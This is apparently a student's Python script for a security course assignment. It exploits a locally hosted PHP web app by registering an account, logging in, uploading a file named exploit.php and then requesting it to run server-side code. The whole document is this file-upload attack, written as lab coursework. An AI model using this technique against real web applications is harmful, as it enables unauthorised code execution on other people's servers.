# CSCI 461, Spring 2021
# Assignment 4 - PHP Exploit
# Coded by Kieran Bessert on 5 Apr 2021
# Last edited on 5 Apr 2021
"""Docstring"""

import requests
S = requests.Session()

# 1-make an account
S.post('http://localhost:8015/music-copyright/cgi-bin/account.php', 
       data={"first":"Bad", "last":"Guy", "email":"xyz", "password":"xyz"})


# 2-log in
S.post('http://localhost:8015/music-copyright/cgi-bin/login.php', 
       data={"email":"xyz", "password":"xyz"})

# 3-upload a file
URL = 'http://localhost:8015/music-copyright/cgi-bin/upload.php'
FILE = {'file': open('exploit.php', 'rb')}
GET_DATA = S.post(URL, files=FILE)

# 4-call the file
J = S.get('http://localhost:8015/music-copyright/cgi-bin/uploads/exploit.php')
print(J.text)
